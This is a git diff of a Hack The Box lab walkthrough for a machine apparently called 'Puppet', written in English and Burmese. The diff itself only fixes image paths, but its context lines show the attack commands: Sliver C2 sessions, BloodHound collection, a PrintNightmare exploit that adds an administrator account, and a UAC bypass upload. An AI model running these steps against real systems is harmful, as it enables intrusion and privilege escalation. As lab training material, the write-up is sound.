@@ -9,7 +9,7 @@ At firts Scan using nmap
 nmap 10.13.38.33 -sC -sV -Pn
 ```
 
-![Puppet Image](./puppet1.png)
+![Puppet](../P/puppet1.png)
 ```cmd
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-27 21:01 +0630
 Nmap scan report for 10.13.38.33
@@ -61,7 +61,7 @@ And then To get persistance using silver2 framework
 ftp 10.13.38.33 
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet2.png)
+![Puppet](../P/puppet2.png)
 
 ```
 cmd
@@ -135,7 +135,7 @@ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33
 2026/10/27 22:39:05 Saved new client config to: /home/kali/.sliver-client/configs/red_127.0.0.1.cfg
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet3.png)
+![Puppet](../P/puppet3.png)
 
 sliver-client_linux ဆိုတာ ပရိုဂရမ် (App) ပါ။
 
@@ -151,7 +151,7 @@ App ကို ဖွင့်လိုက်တဲ့အခါ သော့ခ�
 
 To connect sliver server
 
-![Alt Text](D:\Hack-the-box-main\P\puppet4.png)
+![Puppet](../P/puppet4.png)
 
 ```cmd
 sliver > beacons
@@ -159,13 +159,13 @@ sliver > beacons
 
 ### becacons is .....
 
-![Alt Text](D:\Hack-the-box-main\P\puppet5.png)
+![Puppet](../P/puppet5.png)
 
 ```cmd
 sliver (BLUSHING_ERROR) > interactive
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet6.png)
+![Puppet](../P/puppet6.png)
 
 ### interactive command ဆိုတာ Beacon Mode (မကြာခဏ အချိန်ခြားပြီးမှ သတင်းလာပို့တဲ့ အဆင့်) ကနေ Interactive Session Mode (တိုက်ရိုက် Real-time ချိတ်ဆက်မှု အဆင့်) သို့ ပြောင်းလဲဖို့အတွက် C2 Server ကနေ Target စက်ဆီ အမိန့်ပေးပို့တာ ဖြစ်ပါတယ်။
 
@@ -175,7 +175,7 @@ And then use session id
 use session_id
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet7.png)
+![Puppet](../P/puppet7.png)
 
 ### Puppet is Configuration Management Tool: DevOps နဲ့ System Administration မှာ Puppet ဆိုတာ Server ရာပေါင်းများစွာဆီ ဆော့ဖ်ဝဲလ်တွေ အလိုအလျောက် ထည့်သွင်းပေးတာ၊ Script တွေ Run ပေးတာနဲ့ Security Settings တွေ သတ်မှတ်ပေးတဲ့ Infrastructure Automation Tool တစ်ခု ဖြစ်ပါတယ်။
 
@@ -201,7 +201,7 @@ armory install sa-whoami
 
 To use sa-whoami
 
-![Alt Text](D:\Hack-the-box-main\P\puppet8.png)
+![Puppet](../P/puppet8.png)
 
 Enter 
 ```cmd
@@ -218,14 +218,14 @@ and run
 sharp-hound-4 -s -t 300 -- -c all,gplocalgroup
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet9.png)
+![Puppet](../P/puppet9.png)
 
 and then go to fiel path c://tmp
 ```cmd
 download 20261027120553_BloodHound.zip
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet10.png)
+![Puppet](../P/puppet10.png)
 
 And then install sa-adcs-enum
 ```cmd
@@ -248,7 +248,7 @@ use
 sa-adcs-enum
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet11.png)
+![Puppet](../P/puppet11.png)
 
 ### sa-netstat is Target စက်ပေါ်ရှိ Active Network Connections များ၊ ပွင့်နေသော Listening Ports များနှင့် ၎င်းတို့ကို သုံးစွဲနေသည့် Process IDs (PIDs) / Executable ဖိုင်များ ကို ရှာဖွေစစ်ဆေးရန် (Enumeration လုပ်ရန်) အသုံးပြုပါသည်။
 
@@ -292,14 +292,14 @@ And upload file to C:\\temp\\PrivescCheck.ps1
 upload /home/kali/Downloads/PrivescCheck.ps1 C:\temp\PrivescCheck.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet12.png)
+![Puppet](../P/puppet12.png)
 
 check what vuln have
 ```cmd
 sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\tempPrivescCheck.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet13.png)
+![Puppet](../P/puppet13.png)
 
 ### PrintNightmare (CVE-2021-34527 / CVE-2021-1675) သည် Windows Print Spooler service (spoolsv.exe) တွင် တည်ရှိသော အမှတ်မထင် အခွင့်အရေး ရရှိသွားနိုင်သည့် လုံခြုံရေး အားနည်းချက် (Remote Code Execution / Privilege Escalation) ဖြစ်ပါသည်။
 
@@ -313,7 +313,7 @@ Upload file
 upload /home/kali/Downloads/CVE-2021-34527/CVE-2021-34527.ps1 C:/Windows/temp/CVE-2021-34527.ps1
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet14.png)
+![Puppet](../P/puppet14.png)
 
 ```cmd
 execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". C:/Windows/temp/CVE-2021-34527.ps1; Invoke-Nightmare -NewUser adm1n -NewPassword P@ssw0rd"
@@ -321,7 +321,7 @@ execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". C:/W
 
 ### ဒီ Command က Windows စနစ်တွေမှာ ရှိတဲ့ Print Spooler ဝန်ဆောင်မှုရဲ့ အားနည်းချက် (Vulnerability) တစ်ခုဖြစ်တဲ့ CVE-2021-34527 (PrintNightmare လို့လည်း ခေါ်ပါတယ်) ကို အသုံးချပြီး Windows စနစ်ထဲမှာ Admin အကောင့်အသစ် (New Administrator Account) တစ်ခု ဖန်တီးဖို့ လုပ်ဆောင်တာ ဖြစ်ပါတယ်။
 
-![Alt Text](D:\Hack-the-box-main\P\puppet15.png)
+![Puppet](../P/puppet15.png)
 
 ```cmd
 runas -u adm1n -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
@@ -352,7 +352,7 @@ runas -u adm1n -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
 
 **ခြုံပြောရရင်တော့:** အသစ်ရလာတဲ့ Administrator အကောင့် (`adm1n`) နဲ့ System ထဲမှာ ရှိတဲ့ Malware သို့မဟုတ် C2 Payload တစ်ခုကို Administrator အဆင့် (Privileged context) နဲ့ ဆက်လက် အလုပ်လုပ်ခိုင်းလိုက်တဲ့ Red Teaming ရဲ့ **Privilege Execution / Lateral Movement** အဆင့်ပဲ ဖြစ်ပါတယ်။
 
-![Alt Text](D:\Hack-the-box-main\P\puppet16.png)
+![Puppet](../P/puppet16.png)
 
 check what permission can do this account
 
@@ -360,7 +360,7 @@ check what permission can do this account
 sa-whoami
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet17.png)
+![Puppet](../P/puppet17.png)
 
 **UAC-BOF-Bonanza** ဆိုတာကတော့ Red Teaming နဲ့ Penetration Testing လုပ်တဲ့အခါ Windows စနစ်တွေမှာ **UAC (User Account Control) ကို Bypass လုပ်ဖို့အတွက် အသုံးပြုတဲ့ BOF (Beacon Object File) တွေ စုစည်းထားတဲ့ Open-source repository တစ်ခု** ဖြစ်ပါတယ်။
 
@@ -404,7 +404,7 @@ upload the file to silver server
 upload /home/kali/Downloads/UAC-BOF-Bonanza/SspiUacBypass/bin/standalone/SspiUacBypass.exe C:/Windows/temp/bypass.exe
 ```
 
-![Alt Text](D:\Hack-the-box-main\P\puppet18.png)
+![Puppet](../P/puppet18.png)
 
 
 Run command in sliver server
